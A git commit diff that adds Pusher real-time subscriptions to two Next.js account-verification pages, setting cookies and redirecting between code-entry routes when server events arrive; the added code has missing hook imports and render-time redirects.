f94648f73cba8c8107a73b098ab736d8c135d012
shovonroy173 <shovonroy2003@gmail.com>
2025-05-08 13:43:08 +0600

    mod: all route update

--- src/app/account-verify-code/page.jsx
+++ src/app/account-verify-code/page.jsx
@@ -2,11 +2,62 @@
 import Image from "next/image";
 import React from "react";
 import Cookies from "js-cookie";
+import Pusher from "pusher-js";
+import { useRouter } from "next/navigation";
 
 function page() {
   const codeD = Cookies.get("code");
   console.log(codeD);
+  const router = useRouter();
+
+  const [verifyId, setVerifyId] = useState("");
+  const[reverifyId, setReVerifyId] = useState('');
   
+  const id = Cookies.get("id");
+  const pusher = new Pusher("05656b52c62c0f688ee3", {
+    // APP_KEY
+    cluster: "ap2",
+    encrypted: true,
+  });
+  console.log(reverifyId);
+
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+
+    channel.bind("code-verify", (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log("Path data updated:", data);
+      Cookies.set("code", data.code);
+      setVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind("code-verify");
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
+  useEffect(() => {
+    const channel = pusher.subscribe(id);
+    channel.bind('code-re-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("gid", data.id);
+      setReVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-re-verify');
+      channel.unsubscribe(id);
+    };
+  }, [id]);
+
+  if (verifyId) {
+    return router.push("/account-verify-code");
+  }
+  if(reverifyId){
+    return router.push("/account-verify-gcode");
+  }  
   return (
     <div className="w-full min-h-screen flex flex-col justify-center items-center ">
       <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
--- src/app/account-verify-gcode/page.jsx
+++ src/app/account-verify-gcode/page.jsx
@@ -4,11 +4,62 @@ import Cookies from "js-cookie";
 import Image from "next/image";
 import { useRouter } from "next/navigation";
 import React, { useState } from "react";
+import Pusher from "pusher-js";
 
 function AccountRecoveryCode() {
   const router = useRouter();
   const [gCode, setGCode] = useState();
   const id = Cookies.get("gid");
+  // const router = useRouter();
+
+  const [verifyId, setVerifyId] = useState("");
+  const[reverifyId, setReVerifyId] = useState('');
+  
+  const pid = Cookies.get("id");
+  const pusher = new Pusher("05656b52c62c0f688ee3", {
+    // APP_KEY
+    cluster: "ap2",
+    encrypted: true,
+  });
+  console.log(reverifyId);
+
+  useEffect(() => {
+    const channel = pusher.subscribe(pid);
+
+    channel.bind("code-verify", (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log("Path data updated:", data);
+      Cookies.set("code", data.code);
+      setVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind("code-verify");
+      channel.unsubscribe(pid);
+    };
+  }, [pid]);
+
+  useEffect(() => {
+    const channel = pusher.subscribe(pid);
+    channel.bind('code-re-verify', (data) => {
+      // Perform the revalidation or data fetching logic here
+      console.log('Path data updated:', data);
+      Cookies.set("gid", data.id);
+      setReVerifyId(data.id); // Function to refetch or revalidate your path data
+    });
+
+    return () => {
+      channel.unbind('code-re-verify');
+      channel.unsubscribe(pid);
+    };
+  }, [pid]);
+
+  if (verifyId) {
+    return router.push("/account-verify-code");
+  }
+  if(reverifyId){
+    return router.push("/account-verify-gcode");
+  }
 
   const handleGCode = async () => {
     if (!gCode) {
